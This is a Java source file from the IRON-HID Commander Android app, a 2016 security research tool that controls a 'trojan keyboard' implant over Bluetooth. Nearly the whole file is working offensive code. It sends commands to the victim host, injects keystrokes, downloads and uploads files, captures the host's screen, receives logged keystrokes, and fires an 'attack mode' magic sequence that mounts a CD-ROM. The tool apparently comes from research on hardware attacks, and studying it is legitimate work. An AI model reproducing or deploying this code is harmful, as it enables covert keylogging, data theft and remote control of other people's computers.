/*
           IRON-HID Commander App for the Android Smartphone       
                    Copyright (C) 2016 Seunghun Han 
         at National Security Research Institute of South Korea
*/

/*
Copyright (c) 2016 Seunghun Han at NSR of South Kora

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/


  
package com.example.commander;

import java.io.*;
import java.util.*;

import android.app.Activity;
import android.app.ProgressDialog;
import android.bluetooth.*;
import android.content.*;
import android.net.*;
import android.os.*;
import android.util.*;
import android.webkit.*;

import static android.support.v4.app.ActivityCompat.startActivityForResult;

/**
 *	Command manager class
 *
 *	Process commands to or from the trojan keyboard
 */
public class CommandManager extends Activity
{
	// Variables for bluetooth and thread
	BluetoothSocket mSocket;
	OutputStream mOutputStream = null;
	InputStream mInputStream = null;
	Thread mRecvThread;
	volatile boolean mExitFlag = false;
	MainActivity mActivity = null;

	// Variables for thread
	final int mBufferSize = 4096;
	final byte [] mReadBuffer = new byte [mBufferSize];;
	final byte [] mTokenBuffer = new byte [mBufferSize];;
	final Tokenizer mTokenizer = new Tokenizer();
	
	// Variables for modes
	final static int MODE_SEND_COMMAND = 0;
	final static int MODE_SEND_KEY = 1;	
	final static int MODE_RECV_RESULT = 0;
	final static int MODE_RECV_FILE = 1;
	int mSendMode = MODE_SEND_COMMAND;
	int mRecvMode = MODE_RECV_RESULT;

	// Variable for file & capture receive
	final static int FILE_TYPE_FILE = 0;
	final static int FILE_TYPE_CAPTURE = 1;
	final static int FILE_RECV_HEADER = 0;
	final static int FILE_RECV_CONTENT = 1;
	final static int CHUNK_FILE_SIZE = 64;
	final static int CHUNK_KEY_SIZE = 8;

	FileOutputStream mFileStream = null;
	int mFileSize = 0;
	int mFileRecvSize = 0;
	int mFileRecvMode = FILE_RECV_HEADER;
	String mFilePath;
	long mUpdateTime = System.currentTimeMillis();

	// Magic strings for mode change or send command to keyboard
	// CMD recv mode magic
	byte [] mCmdSendModeMagic = 
		{ (byte) 0xB2, (byte) 0xF9, (byte) 0xF4, (byte) 0xF7, (byte) 0x43, (byte) 0xE6, (byte) 0xF9, 
		  (byte) 0x72, (byte) 0x4D, (byte) 0x9F, (byte) 0xC8, (byte) 0x25, (byte) 0x52, (byte) 0x29, 
		  (byte) 0xCA, (byte) 0x1A };
	
	// Key recv mode magic
	byte [] mKeySendModeMagic = 
		{ (byte) 0xEF, (byte) 0x12, (byte) 0x21, (byte) 0xFB, (byte) 0xC9, (byte) 0xDA, (byte) 0x5D,
		  (byte) 0x56, (byte) 0x69, (byte) 0x4A, (byte) 0x60, (byte) 0x08, (byte) 0x89, (byte) 0x90,
		  (byte) 0xD4, (byte) 0x11 };

	// Data recv mode magic
	byte [] mDataSendModeMagic = 
		{ (byte) 0x5C, (byte) 0x7A, (byte) 0xCE, (byte) 0xBC, (byte) 0x80, (byte) 0x74, (byte) 0x5B,
		  (byte) 0x37, (byte) 0x56, (byte) 0x63, (byte) 0x60, (byte) 0x16, (byte) 0x68, (byte) 0x97,
		  (byte) 0x88, (byte) 0xC1 };
	// Attack mode magic
	byte [] mAttackModeMagic = 
		{ (byte) 0xA9, (byte) 0x0B, (byte) 0x3C, (byte) 0x2C, (byte) 0xE3, (byte) 0xC5, (byte) 0x83,
		  (byte) 0x44, (byte) 0x84, (byte) 0xAD, (byte) 0xE3, (byte) 0x29, (byte) 0xF7, (byte) 0x0A,
		  (byte) 0x3F, (byte) 0x91 };
	
	// Manager for key code
	KeyCodeManager mKeyCodeManager = new KeyCodeManager();

    /**
     *  Progress dialog for sending file
     */
    public class SendProgressDlg extends AsyncTask
    {
        private ProgressDialog mDlg;
        private Context mContext;
        private String mSendFilePath;
        private FileInputStream mFileSendStream;
        private boolean mCancel;

        /**
         *  Progress Dlg
         */
        public SendProgressDlg(Context context, String sendFilePath)
        {
            mContext = context;
            mSendFilePath = sendFilePath;
            mCancel = false;
        }

        /**
         *  Before run
         */
        @Override
        protected void onPreExecute()
        {
            mDlg = new ProgressDialog(mContext);
            mDlg.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
            mDlg.setMessage("Send file");
            mDlg.setCancelable(true);
            mDlg.setCanceledOnTouchOutside(false);

            // Process cancel
            mDlg.setOnCancelListener(new DialogInterface.OnCancelListener()
            {
                @Override
                public void onCancel(DialogInterface dialog)
                {
                    mCancel = true;
                }
            });

            mDlg.show();

            super.onPreExecute();
        }

        /**
         *  Cancel task
         */
        @Override
        protected void onCancelled()
        {
            super.onCancelled();
        }

        /**
         *  Send files
         */
        @Override
        protected Object doInBackground(Object[] objects)
        {
            long size;
            long loopMaxCount;

            // Open file and send to the host
            try
            {
                Thread.sleep(1500);

                // Open file
                File file = new File(mSendFilePath);
                size = file.length();

                // Send content
                byte [] buffer = new byte [CHUNK_FILE_SIZE];
                mFileSendStream = new FileInputStream(mSendFilePath);

                loopMaxCount = (size + CHUNK_FILE_SIZE - 1) / CHUNK_FILE_SIZE;
                for (int i = 0 ; i < loopMaxCount ; i++)
                {
                    mFileSendStream.read(buffer);
                    if (i == (loopMaxCount - 1))
                    {
                        mOutputStream.write(buffer, 0, (int) (size % CHUNK_FILE_SIZE));
                    }
                    else
                    {
                        mOutputStream.write(buffer);
                    }

                    // Update progress
                    int progress = (int) (i * 100 / ((size + CHUNK_FILE_SIZE - 1) / 
						CHUNK_FILE_SIZE));
                    publishProgress(progress);
                    Thread.sleep(20);

                    if (mCancel == true)
                    {
                        break;
                    }
                }

                publishProgress(100);

                // Wait until buffer cleared
                Thread.sleep(2000);
            }
            catch (Exception e)
            {
                e.printStackTrace();
                return false;
            }

            return null;
        }

        @Override
        protected void onProgressUpdate(Object[] values)
        {
            // Update progress
            mDlg.setProgress((Integer)(values[0]));

            super.onProgressUpdate(values);
        }

        /**
         *  End run
         */
        @Override
        protected void onPostExecute(Object o)
        {
            mDlg.dismiss();

            try
            {
                mFileSendStream.close();
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }

            super.onPostExecute(o);
        }
    }


	/**
	 *	Constructor
	 */
	CommandManager(MainActivity activity, BluetoothSocket socket)
	{
		mSocket = socket;
		mActivity = activity;

		try 
		{
			mOutputStream = mSocket.getOutputStream();
			mInputStream = mSocket.getInputStream();
		}
		catch (IOException e) 
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		StartRecvThread();
	}	
	
	/**
	 *	Finalize
	 */
	public void Finalize()
	{
		// Thread stop
		if (mRecvThread != null)
		{
			try
			{
				mExitFlag = true;
				mRecvThread.join();
				mRecvThread.stop();
			}
			catch(Exception e)
			{
				// Do nothing
			}
			
			//mRecvThread = null;
		}
		
		// Close all stream
		if (mOutputStream != null)
		{
			try 
			{
				mOutputStream.close();
			}
			catch (IOException e) 
			{
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			mOutputStream = null;
		}
		
		if (mInputStream != null)
		{
			try 
			{
				mInputStream.close();
			}
			catch (IOException e) 
			{
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			mInputStream = null;
		}
				
		mTokenizer.ClearBuffer();
	}

	/**
	 *	Send command to host
	 */
	public void SendCommand(String data)
	{
		String stx = "C;";
		String etx = ";";
		byte [] dataBytes = data.getBytes();
	
		// Wait until file receiving complete
		if (mRecvMode != MODE_RECV_RESULT)
		{
			mActivity.ShowToast("Wait until file receiving complete!!");			
			return ;
		}
		
		
		// Switch to COMMAND Mode
		SwitchMode(MODE_SEND_COMMAND);
		
		// Special command cases change recv mode to file receive mode
		if (data.charAt(0) == '!')
		{
			if (data.contains("!get"))
			{
				mRecvMode = MODE_RECV_FILE;
				
				// Get files protocol(G;<File Name>;)
				stx = "G;";
				
				// Make file name
				if (data.length() < 6)
				{
					data = "dummy.txt";
				}
				else
				{
					data = data.substring(5);
				}
				
				dataBytes = data.getBytes();
				
				// Change mode to receive file
				File file = new File(data);
				PrepareToReceiveFile(FILE_TYPE_FILE, file.getName());
			}
            else if (data.contains("!put"))
            {
                // Get files protocol(P;<File Name>;)
                stx = "P;";

                // Make file name
                if (data.length() < 6)
                {
                    data = "dummy.txt";
                }
                else
                {
                    data = data.substring(5);
                }

                int index = data.indexOf(' ');
                if (index == -1)
                {
                    return ;
                }

                String localName = data.substring(index + 1);
                String remoteName = data.substring(0, index);

                // Open file and add length to the remote file name
                File file = new File(localName);
                long size = file.length();
                remoteName = String.format("%s?%d", remoteName, size);
                dataBytes = remoteName.getBytes();

                // Change mode to send file
                SendProgressDlg dlg = new SendProgressDlg(mActivity, localName);
                dlg.execute();
            }
			else if (data.contains("!capture"))
			{
				mRecvMode = MODE_RECV_FILE;

				// Make file name
				if (data.length() < 10)
				{
					data = "1.jpg";
				}
				else
				{
					data = data.substring(9);
				}

				// Change mode to receive screen
				File file = new File(data);

				// Capture screen protocol(S;;)
				stx = "S;";
				data = "";
				dataBytes = data.getBytes();

				PrepareToReceiveFile(FILE_TYPE_CAPTURE, file.getName());
			}
			else if (data.equals("!launch"))
			{
				stx = "";
				dataBytes = mAttackModeMagic;
				etx = "";

				mActivity.AddMsgToCommandView(MainActivity.VIEW_ID_COMMAND, 
					">> Start to mount CD-ROM <<\n");
			}
		}
		
		try 
		{
			// Simple protocol(ex> C;<data>;)
			mOutputStream.write(stx.getBytes());		// C;
			mOutputStream.write(dataBytes);				// <data>
			mOutputStream.write(etx.getBytes());		// ;
		}
		catch (IOException e) 
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
	}

	/**
	 *	Send keys to host
	 */
	public void SendKey(String data)
	{
		String convertedData;
		List<byte[]> dataByteList;
		
		if (data == "")
		{
			return ;
		}
		
		// Switch to COMMAND Mode
		SwitchMode(MODE_SEND_KEY);
		
		// Convert strings to keyboard's simple protocol
		convertedData = mKeyCodeManager.ConvertAsciiKeyToKeyData(data);
		dataByteList = mKeyCodeManager.ConvertKeyDataToUSBData(convertedData);
		if (dataByteList == null)
		{
			return ;
		}

		// Send each key data
		try
		{
			for (byte [] dataInList : dataByteList)
			{
				mOutputStream.write(dataInList);
				Thread.sleep(10);
			}
		}
		catch (IOException e) 
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		} 
		catch (InterruptedException e) 
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		dataByteList.clear();
		dataByteList = null;
	}
	
	/**
	 * 	Switch mode command to key & key to command 
	 */
	private void SwitchMode(int sendMode)
	{
		if (mOutputStream == null)
		{
			return ;
		}
		
		if (mSendMode == sendMode)
		{
			return ;
		}
		
		// Send magic string
		try 
		{
			if (sendMode == MODE_SEND_KEY)
			{
				mOutputStream.write(mKeySendModeMagic);
			}
			else
			{
				mOutputStream.write(mCmdSendModeMagic);				
			}
		} 
		catch (IOException e) 
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		mSendMode = sendMode;
	}
	
	
	/**
	 *	Receive from bluetooth serial
	 */
	private void StartRecvThread()
	{
		Log.d("TAG_TROJAN", "Start Thread");
		mRecvThread = new Thread(new Runnable()
		{
			@Override
			public void run() 
			{
				while(mExitFlag == false)
				{
					ProcessCommand();
				}
			}
		});
		mRecvThread.start();
	}		
	
	/**
	 *	Read Token
	 */
	private int ReadToken(int iFixedTokenSize, byte [] token)
	{
		int tokenSize = 0;
		
		while(mExitFlag == false)
		{
			int availSize = 0;
			
			try 
			{
				availSize = mInputStream.available();
			
				if (availSize > 0)
				{
					if (availSize > mBufferSize)
					{
						availSize = mBufferSize;
					}
					
					// Add data to tokenizer
					mInputStream.read(mReadBuffer, 0, availSize);
					mTokenizer.AddData(mReadBuffer, availSize);
				}
				
				// Get token
				tokenSize = mTokenizer.GetToken(iFixedTokenSize, token);
				if (tokenSize == -1)
				{
					// No token & no input
					if (availSize <= 0)
					{
						Thread.sleep(100);
					}
					continue;
				}
				
				break;
			} 
			catch (IOException e) 
			{
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			catch (InterruptedException e) 
			{
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return tokenSize;
	}
	
	/**
	 * 	Process received tokens
	 */
	private void ProcessCommand()
	{
		final int STATE_CMDRECV = 0;
		final int STATE_DATARECV1 = 1;
		final int STATE_DATARECV2 = 2;
		int state = STATE_CMDRECV;
		int fixedTokenSize = 0;
		// Protocol STX
		final byte RES_FILEDATA = 'F';
		final byte RES_MONITORKEY = 'M';
		final byte RES_DEBUG = 'D';
		final byte RES_REQUESTKEY = 'K';
		final byte RES_REQATTACKFLAG = 'A';
		final byte RES_REQCOMMAND = 'C';
		byte command = 0;
		int tokenSize = 0;
		
		while(mExitFlag == false)
		{
			// Preset receive size
			if ((command == RES_FILEDATA) && (state == STATE_DATARECV2))
			{
				fixedTokenSize = CHUNK_FILE_SIZE;
			}
			else if ((command == RES_MONITORKEY) && (state == STATE_DATARECV2))
			{
				fixedTokenSize = CHUNK_KEY_SIZE;
			}
			else
			{
				fixedTokenSize = 0;
			}
			
			// Receive
			tokenSize = ReadToken(fixedTokenSize, mTokenBuffer);
			switch(state)
			{
			case STATE_CMDRECV:
				state = STATE_DATARECV1;
				command = mTokenBuffer[0];
				break;
				
			case STATE_DATARECV1:
				state = STATE_DATARECV2;
				break;

			case STATE_DATARECV2:
				state = STATE_CMDRECV;
				//command = 0;
				break;
			}

			// Validation check
			if ((state == STATE_DATARECV1) && (tokenSize != 1))
			{
				continue;
			}
			
			if (state != STATE_CMDRECV)
			{
				continue;
			}
			
			// Process received command
			switch(command)
			{
			case RES_MONITORKEY:
				ProcessMonitorKey(mTokenBuffer);
				break;
			
			case RES_FILEDATA:
				ProcessFileData(mTokenBuffer);
				break;
				
			case RES_DEBUG:
				//ProcessDebugData(mTokenBuffer);
				break;

			case RES_REQUESTKEY:
			case RES_REQATTACKFLAG:
			case RES_REQCOMMAND:
			default:
				// Skip this command
				break;
			}

			command = 0;			
		}
	}
	
	/**
	 *	Process monitor key packet
	 */
	private void ProcessMonitorKey(byte [] tokenBuffer)
	{
		String data = mKeyCodeManager.ConvertKeyMonitorPacketToString(tokenBuffer);
		
		if (data != "")
		{
			mActivity.AddMsgToKeyView(MainActivity.VIEW_ID_KEY, data);
		}
	}
	
	/**
	 * 	Process file data packet
	 */
	private void ProcessFileData(byte [] tokenBuffer)
	{
		int nullIndex;
		
		// Process commands result
		if (mRecvMode == MODE_RECV_RESULT)
		{
			for (nullIndex = 0 ; nullIndex < tokenBuffer.length ; nullIndex++)
			{
				if (tokenBuffer[nullIndex] == '\0')
				{
					break;
				}
			}
			
			String data = new String(tokenBuffer, 0, nullIndex);
			if ((data != null) && (data != ""))
			{
				mActivity.AddMsgToCommandView(MainActivity.VIEW_ID_COMMAND, data);
			}
			data = null;
		}
		else
		{
			// Save file contents
			SaveFileContent(tokenBuffer);
		}
	}
	
	/**
	 *	Process debug packet for debugging
	 */
	private void ProcessDebugData(byte [] tokenBuffer)
	{
		int nullIndex;
		
		for (nullIndex = 0 ; nullIndex < tokenBuffer.length ; nullIndex++)
		{
			if (tokenBuffer[nullIndex] == '\0')
			{
				break;
			}
		}
		
		String data = new String(tokenBuffer, 0, nullIndex);
		if ((data != null) && (data != ""))
		{
			mActivity.AddMsgToCommandView(MainActivity.VIEW_ID_COMMAND, 
				"host> " + data);
		}
		data = null;
	}
	
	/**
	 * 	Check external storage to write
	 */
	public boolean IsExternalStorageWritable() 
	{
	    String state = Environment.getExternalStorageState();
	    if (Environment.MEDIA_MOUNTED.equals(state)) 
	    {
	        return true;
	    }
	    return false;
	}
	
	/**
	 *	Prepare to receive
	 */
	public boolean PrepareToReceiveFile(int type, String fileName)
	{
		File path = android.os.Environment.getExternalStorageDirectory();
		String directory;
		File newPath;
		String subName;
		
		if (type == FILE_TYPE_FILE)
		{
			subName = "files";
			directory = path.getAbsolutePath() + "/IRON-HID/" + subName;
			newPath = new File(directory);
		}
		else
		{
			subName = "captures";
			directory = path.getAbsolutePath() + "/IRON-HID/" + subName;
			newPath = new File(directory);
		}
		
		if (newPath.exists() == false)
		{
			if (newPath.mkdirs() == false)
			{
				return false;
			}
		}
		
		mFilePath = directory + "/" + fileName;
		newPath = new File(mFilePath);

		try 
		{
			newPath.deleteOnExit();
			newPath.createNewFile();
		}
		catch (IOException e) 
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
	
		try 
		{
		    mFileStream = new FileOutputStream(mFilePath);
		}
		catch (Exception e)
		{
			e.printStackTrace();
			return false;
		}
		
		mFileRecvMode = FILE_RECV_HEADER;
		mFileRecvSize = 0;

		String sData = String.format(">> Start to receive %s files <<\n", fileName);
		mActivity.AddMsgToCommandView(MainActivity.VIEW_ID_COMMAND, sData);
		return true;
	}

	/**
	 * 	Save file contents
	 */
	public void SaveFileContent(byte [] data)
	{
		int recvSize;
		
		// Receive file length
		if (mFileRecvMode == FILE_RECV_HEADER)
		{
			String fileSize = "0";
			for (int i = 0 ; i < data.length ; i++)
			{
				if (data[i] == '\0')
				{
					fileSize = new String(data, 0, i);
					break;
				}
			}
			
			mFileSize = Integer.valueOf(fileSize);

			// No file exist
			if (mFileSize == 0)
			{
				mRecvMode = MODE_RECV_RESULT;
				mActivity.AddMsgToCommandView(MainActivity.VIEW_ID_COMMAND, 
					">> File not found <<\n");
			}
			
			mFileRecvMode = FILE_RECV_CONTENT;
			return ;
		}
		
	    try 
	    {
	    	recvSize = CHUNK_FILE_SIZE;
	    	if (mFileRecvSize + recvSize > mFileSize)
	    	{
	    		recvSize = mFileSize - mFileRecvSize;
	    	}
	    	
			mFileStream.write(data, 0, recvSize);		
			mFileRecvSize += recvSize;
			
			// Update every 1 second
			if (System.currentTimeMillis() - mUpdateTime > 1000)
			{
				String sData = String.format("%d/%d\n", mFileRecvSize, mFileSize);

				mActivity.AddMsgToCommandView(MainActivity.VIEW_ID_COMMAND, sData);
				mUpdateTime = System.currentTimeMillis();
			}
			
			// Receive complete
			if (mFileRecvSize == mFileSize)
			{
				mFileStream.close();
				mRecvMode = MODE_RECV_RESULT;
				mFileStream = null;
				
				mActivity.AddMsgToCommandView(MainActivity.VIEW_ID_COMMAND, 
					">> Receive file complete <<\n");
				
				// Start intent
				StartOpenFileIntent();
			}
	    } 
	    catch (IOException e) 
	    {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * 	Start intent for file open
	 */
	private void StartOpenFileIntent()
	{
		// Make intent
		File file = new File(mFilePath);
		MimeTypeMap map = MimeTypeMap.getSingleton();
		String extension = MimeTypeMap.getFileExtensionFromUrl(file.getName());
		String type = map.getMimeTypeFromExtension(extension);
		if (type == null)
		{
			type = "*/*";
		}
		
		Intent intent = new Intent(Intent.ACTION_VIEW);
		Uri dataForIntent = Uri.fromFile(file);
		intent.setDataAndType(dataForIntent, type);
		mActivity.startActivity(intent);
	}

}
